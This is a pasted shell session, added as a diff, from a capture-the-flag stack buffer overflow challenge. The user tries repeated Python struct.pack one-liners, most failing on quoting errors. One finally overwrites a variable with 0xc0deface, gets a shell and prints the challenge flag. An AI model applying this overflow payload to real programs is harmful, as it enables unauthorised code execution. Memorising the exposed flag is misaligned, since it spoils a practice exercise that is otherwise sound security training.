@@ -1,0 +1,104 @@
+# copied from the shit webshell
+
+pico62187@shell:/home/overflow1$ ./overflow1 $(printf "tes
+t")
+The secret is 0
+pico62187@shell:/home/overflow1$ ./overflow1 $(printf "aaa
+aaaaaaaaaaaaa\xc0\xde\xfa\xce")
+The secret is cefadec0
+pico62187@shell:/home/overflow1$ ./overflow1 $(python -c "
+import struct; q=lambda x: struct.pack("I", x);print(a*16 
++ q(0xc0deface))
+> 
+> -bash: unexpected EOF while looking for matching `"'
+-bash: syntax error: unexpected end of file
+pico62187@shell:/home/overflow1$ ./overflow1 $(python -c "
+import struct; q=lambda x: struct.pack("I", x);print(a*16 
++ q(0xc0deface)")
+
+
+
+  File "<string>", line 1                                 
+    import struct; q=lambda x: struct.pack(I, x);print(a*1
+6 + q(0xc0deface)                                         
+
+
+                ^                                         
+SyntaxError: unexpected EOF while parsing                 
+pico62187@shell:/home/overflow1$ ./overflow1 $(python -c "
+import struct; q=lambda x: struct.pack("I", x);print(a*16 
++ q'(0xc0deface')")                                       
+  File "<string>", line 1                                 
+    import struct; q=lambda x: struct.pack(I, x);print(a*1
+6 + q'(0xc0deface')                                       
+
+
+                 ^                                        
+SyntaxError: invalid syntax                               
+pico62187@shell:/home/overflow1$ ./overflow1 $(python -c "
+import struct; q=lambda x: struct.pack("I", x);print(a*16 
++ q('0xc0deface')")                                       
+  File "<string>", line 1                                 
+    import struct; q=lambda x: struct.pack(I, x);print(a*1
+6 + q('0xc0deface')                                       
+
+
+                  ^                                       
+SyntaxError: unexpected EOF while parsing                 
+pico62187@shell:/home/overflow1$ python -c "import struct;
+ q=lambda x: struct.pack("I", x);print(a*16 + q('0xc0defac
+e')"                                                      
+  File "<string>", line 1                                 
+    import struct; q=lambda x: struct.pack(I, x);print(a*1
+6 + q('0xc0deface')                                       
+
+
+                  ^                                       
+SyntaxError: unexpected EOF while parsing                 
+pico62187@shell:/home/overflow1$ python -c "import struct;
+ q=lambda x: struct.pack("I", x);print(a*16, q('0xc0deface
+')"                                                       
+  File "<string>", line 1                                 
+    import struct; q=lambda x: struct.pack(I, x);print(a*1
+6, q('0xc0deface')                                        
+
+
+                 ^                                        
+SyntaxError: unexpected EOF while parsing                 
+pico62187@shell:/home/overflow1$ python -c "import struct;
+ q=lambda x: struct.pack("I", x);q(11)"                   
+Traceback (most recent call last):
+  File "<string>", line 1, in <module>                    
+  File "<string>", line 1, in <lambda>                    
+NameError: global name 'I' is not defined                 
+pico62187@shell:/home/overflow1$ python -c 'import struct;
+ q=lambda x: struct.pack("I", x);q(11)'                   
+pico62187@shell:/home/overflow1$ python -c 'import struct;
+ q=lambda x: struct.pack("I", x);print(q(11))'
+                                                          
+                                                          
+pico62187@shell:/home/overflow1$ python -c 'import struct;
+ q=lambda x: struct.pack("I", x);print(q(0xc0deface))'    
+                                                          
+pico62187@shell:/home/overflow1$ python -c 'import struct;
+ q=lambda x: struct.pack("I", x);print(q("0xc0deface"))'
+Traceback (most recent call last):                        
+  File "<string>", line 1, in <module>                    
+  File "<string>", line 1, in <lambda>                    
+struct.error: cannot convert argument to integer          
+pico62187@shell:/home/overflow1$ python -c 'import struct;
+ q=lambda x: struct.pack("I", x);print(q(0xc0deface))'    
+                                                          
+pico62187@shell:/home/overflow1$ python -c 'import struct;
+ q=lambda x: struct.pack("I", x);print("a"*16 + q(0xc0defa
+ce))'
+aaaaaaaaaaaaaaaa                                          
+pico62187@shell:/home/overflow1$ ./overflow1 $(python -c 'import struct; q=lambda x: struct.pack("I", x);print("a"*16 + q(0xc0deface))')
+$ ls                                                      
+flag.txt  Makefile  overflow1  overflow1.c                
+$ cat fla                                                 
+cat: fla: No such file or directory                       
+$ cat flag.txt                                            
+ooh_so_critical                                           
+$                                                         
+pico62187@shell:/home/overflow1$                          
